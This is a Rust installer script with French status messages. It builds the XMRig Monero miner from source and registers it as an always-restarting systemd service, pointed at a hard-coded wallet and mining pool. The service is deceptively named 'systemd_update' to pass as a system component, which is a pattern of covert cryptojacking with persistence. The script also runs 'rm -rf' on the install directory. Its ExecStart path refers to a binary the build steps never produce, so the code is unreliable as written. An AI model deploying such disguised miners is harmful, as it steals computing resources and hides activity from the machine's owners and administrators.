// main.rs

use std::{fs::write, path::Path, process::Command as StdCommand};
use tokio::{process::Command, time::{sleep, Duration}};
use std::error::Error;

const XMR_REPO: &str = "https://github.com/xmrig/xmrig.git";
const XMR_DIR: &str = "/opt/xmrig";
const BUILD_DIR: &str = "/opt/xmrig/build";
const XMR_WALLET: &str = "47DHjBKKgqTotSG9rr3Ar";
const POOL_URL: &str = "pool.supportxmr.com:3333";
const WORKER_NAME: &str = "rust-miner";

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    install_dependencies().await?;
    cleanup_previous_install().await?;
    setup_xmrig().await?;
    create_systemd_service().await?;
    start_systemd_service().await?;
    println!("\n✅ Tout est prêt !");
    Ok(())
}

fn get_package_manager() -> Result<&'static str, Box<dyn Error>> {
    if StdCommand::new("which").arg("apt").output()?.status.success() {
        Ok("apt")
    } else if StdCommand::new("which").arg("dnf").output()?.status.success() {
        Ok("dnf")
    } else {
        Err("❌ Aucun gestionnaire de paquets compatible détecté (apt ou dnf)".into())
    }
}

async fn run_cmd(cmd: &str) -> Result<(), Box<dyn Error>> {
    println!("> {}", cmd);
    let mut child = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .spawn()?;
    let status = child.wait().await?;
    if !status.success() {
        Err(format!("❌ La commande a échoué ({})", cmd))?
    }
    Ok(())
}

async fn install_dependencies() -> Result<(), Box<dyn Error>> {
    println!("[+] Installation des dépendances...");

    // Prise en charge des distros Debian (apt) et Fedora (dnf)
    match get_package_manager()? {
        "apt" => {
            run_cmd("apt-get update").await?;
            run_cmd("apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev cargo").await?;
        }
        "dnf" => {
            run_cmd("dnf makecache").await?;
            run_cmd("dnf install -y git cmake gcc gcc-c++ openssl-devel hwloc-devel libuv-devel make").await?;
        }
        _ => unreachable!(),
    }

    Ok(())
}

async fn cleanup_previous_install() -> Result<(), Box<dyn Error>> {
    println!("[+] Nettoyage d'une ancienne installation (le cas échéant)...");
    if Path::new(XMR_DIR).exists() {
        run_cmd(&format!("rm -rf {}", XMR_DIR)).await?;
        sleep(Duration::from_secs(1)).await;
    }
    Ok(())
}

async fn setup_xmrig() -> Result<(), Box<dyn Error>> {
    println!("[+] Clonage du dépôt XMRig dans {}", XMR_DIR);
    run_cmd(&format!("git clone {} {}", XMR_REPO, XMR_DIR)).await?;
    println!("[+] Création du répertoire de build et compilation");
    run_cmd(&format!("mkdir -p {} && cd {} && cmake .. && make -j$(nproc)", BUILD_DIR, BUILD_DIR)).await?;
    Ok(())
}

async fn create_systemd_service() -> Result<(), Box<dyn Error>> {
    println!("[+] Génération du service systemd pour xmrig");
    let service_content = format!(
        "[Unit]
Description=systemd_update
After=network.target

[Service]
Type=simple
ExecStart={build}/systemd_update -o {pool} -u {wallet} -k --rig-id {worker}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
",
        build = BUILD_DIR,
        pool = POOL_URL,
        wallet = XMR_WALLET,
        worker = WORKER_NAME
    );
    write("/etc/systemd/system/systemd_update.service", service_content)?;
    Ok(())
}

async fn start_systemd_service() -> Result<(), Box<dyn Error>> {
    println!("[+] Activation et démarrage du service systemd_update");
    run_cmd("systemctl daemon-reload").await?;
    run_cmd("systemctl enable systemd_update").await?;
    run_cmd("systemctl start systemd_update").await?;
    Ok(())
}
